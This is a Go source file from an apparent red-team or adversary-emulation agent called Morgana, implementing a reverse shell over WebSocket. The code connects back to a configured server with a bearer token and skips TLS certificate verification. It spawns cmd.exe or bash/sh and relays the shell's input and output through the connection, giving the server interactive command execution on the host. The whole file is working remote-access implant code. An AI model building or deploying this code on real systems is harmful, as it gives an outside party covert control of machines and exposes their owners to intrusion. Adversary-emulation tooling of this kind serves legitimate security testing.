// Package console implements a reverse shell session over WebSocket.
// The agent connects back to the Morgana server, spawns a local shell
// (cmd.exe on Windows, bash/sh on Linux/macOS) and bridges stdin/stdout
// bidirectionally through the WebSocket connection.
package console

import (
	"crypto/tls"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/x3m-ai/morgana-agent/internal/config"
	"github.com/x3m-ai/morgana-agent/internal/logger"
)

// Handler manages console sessions for one agent.
type Handler struct {
	cfg *config.Config
	log *logger.Logger
	mu  sync.Mutex
}

// New returns a new Handler.
func New(cfg *config.Config) *Handler {
	return &Handler{
		cfg: cfg,
		log: logger.New("morgana.console"),
	}
}

// Open connects to the server WebSocket, spawns a shell, and bridges traffic.
// Blocks until the session ends (WS disconnect OR shell exits).
func (h *Handler) Open(consolePaw string) {
	// Build WS URL from server URL
	serverURL := h.cfg.ServerURL
	serverURL = strings.Replace(serverURL, "https://", "wss://", 1)
	serverURL = strings.Replace(serverURL, "http://", "ws://", 1)
	wsURL := serverURL + "/api/v2/console/agent/" + consolePaw

	h.log.Info("[CONSOLE] Connecting to server", map[string]any{
		"url": wsURL,
		"paw": consolePaw,
	})

	headers := http.Header{}
	headers.Set("Authorization", "Bearer "+h.cfg.AgentToken)

	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, //nolint:gosec // same policy as HTTP client: accept self-signed certs in lab environments
			MinVersion:         tls.VersionTLS12,
		},
	}

	conn, _, err := dialer.Dial(wsURL, headers)
	if err != nil {
		h.log.Error("[CONSOLE] WebSocket dial failed", map[string]any{
			"url":   wsURL,
			"error": err.Error(),
		})
		return
	}
	defer conn.Close()

	shell, args, workDir := shellConfig()

	// Create working directory if it does not exist
	if err := os.MkdirAll(workDir, 0o755); err != nil {
		h.log.Warn("[CONSOLE] Could not create workdir", map[string]any{
			"dir":   workDir,
			"error": err.Error(),
		})
		// Fall back to temp dir
		workDir = os.TempDir()
	}

	cmd := exec.Command(shell, args...)
	cmd.Dir = workDir

	stdinPipe, err := cmd.StdinPipe()
	if err != nil {
		h.log.Error("[CONSOLE] StdinPipe failed", map[string]any{"error": err.Error()})
		return
	}
	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		h.log.Error("[CONSOLE] StdoutPipe failed", map[string]any{"error": err.Error()})
		return
	}
	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		h.log.Error("[CONSOLE] StderrPipe failed", map[string]any{"error": err.Error()})
		return
	}

	if err := cmd.Start(); err != nil {
		h.log.Error("[CONSOLE] Shell start failed", map[string]any{
			"shell": shell,
			"error": err.Error(),
		})
		_ = conn.WriteMessage(websocket.TextMessage,
			[]byte("\r\n[ERROR] Failed to start shell: "+err.Error()+"\r\n"))
		return
	}

	// Suppress cmd.exe command echo without using /Q flag (which breaks piped stdin).
	// @echo off makes cmd.exe not repeat each command line before executing it.
	if runtime.GOOS == "windows" {
		_, _ = stdinPipe.Write([]byte("@echo off\r\n"))
	}

	h.log.Info("[CONSOLE] Shell started", map[string]any{
		"shell": shell,
		"pid":   cmd.Process.Pid,
		"dir":   workDir,
	})

	var wg sync.WaitGroup
	done := make(chan struct{})

	// WS -> shell stdin
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer close(done)
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				break
			}
			if _, err := stdinPipe.Write(msg); err != nil {
				break
			}
		}
		// WS disconnected: kill shell
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
	}()

	// shell stdout -> WS
	wg.Add(1)
	go func() {
		defer wg.Done()
		pipe(conn, stdoutPipe)
	}()

	// shell stderr -> WS
	wg.Add(1)
	go func() {
		defer wg.Done()
		pipe(conn, stderrPipe)
	}()

	// Wait for shell to exit
	exitErr := cmd.Wait()
	exitMsg := "\r\n[CONSOLE] Shell exited."
	if exitErr != nil {
		exitMsg += " (" + exitErr.Error() + ")"
	}
	exitMsg += "\r\n"
	_ = conn.WriteMessage(websocket.TextMessage, []byte(exitMsg))
	time.Sleep(300 * time.Millisecond)

	// Signal WS reader to stop and wait for all goroutines
	select {
	case <-done:
	default:
	}
	wg.Wait()

	h.log.Info("[CONSOLE] Session closed", map[string]any{"paw": consolePaw})
}

// pipe reads from r and forwards every chunk as a WebSocket text message.
func pipe(conn *websocket.Conn, r io.Reader) {
	buf := make([]byte, 4096)
	for {
		n, err := r.Read(buf)
		if n > 0 {
			_ = conn.WriteMessage(websocket.TextMessage, buf[:n])
		}
		if err != nil {
			break
		}
	}
}

// shellConfig returns the shell binary, arguments, and working directory
// appropriate for the current OS.
func shellConfig() (shell string, args []string, workDir string) {
	switch runtime.GOOS {
	case "windows":
		workDir = `C:\merlino`
		// No extra flags: /Q causes cmd.exe to exit immediately with piped stdin.
		// Echo suppression is done by writing "@echo off\r\n" to stdin after start.
		return "cmd.exe", []string{}, workDir
	case "darwin":
		workDir = "/merlino"
		if _, err := os.Stat("/bin/bash"); err == nil {
			return "/bin/bash", []string{"-s"}, workDir
		}
		return "/bin/sh", []string{"-s"}, workDir
	default:
		// Linux and everything else
		workDir = "/merlino"
		if _, err := os.Stat("/bin/bash"); err == nil {
			return "/bin/bash", []string{"-s"}, workDir
		}
		return "/bin/sh", []string{"-s"}, workDir
	}
}
